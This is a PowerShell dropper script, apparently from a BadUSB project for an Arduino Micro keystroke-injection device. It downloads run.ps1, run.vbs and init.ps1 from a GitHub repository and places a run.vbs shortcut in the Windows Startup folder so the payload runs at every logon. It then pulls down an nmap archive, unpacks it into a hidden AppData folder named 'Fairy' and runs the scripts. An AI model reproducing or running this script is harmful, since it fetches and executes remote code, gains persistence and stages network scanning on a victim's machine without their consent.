# download run and init
Invoke-WebRequest -Uri https://raw.githubusercontent.com/h3xagon0001/arduino-micro-badusb/refs/heads/main/run.ps1 -OutFile run.ps1
Invoke-WebRequest -Uri https://raw.githubusercontent.com/h3xagon0001/arduino-micro-badusb/refs/heads/main/run.vbs -OutFile run.vbs

Invoke-WebRequest -Uri https://raw.githubusercontent.com/h3xagon0001/arduino-micro-badusb/refs/heads/main/init.ps1 -OutFile init.ps1

# create shortcut in startup folder
$shell = New-Object -ComObject WScript.Shell
$shortcut = $shell.CreateShortcut("$($env:APPDATA)\Microsoft\Windows\Start Menu\Programs\Startup\run.lnk")
$shortcut.TargetPath = "$($env:APPDATA)\Fairy\run.vbs"
$shortcut.Save()

# download and extract nmap
Invoke-WebRequest -Uri https://github.com/h3xagon0001/arduino-micro-badusb/raw/refs/heads/main/nmap.zip -OutFile nmap.zip
Expand-Archive -LiteralPath "./nmap.zip" -DestinationPath "$($env:APPDATA)\Fairy" -Force; ./fairy.ps1


# could add shortcut to startup here

# run run.vbs for the first time
./run.vbs


exit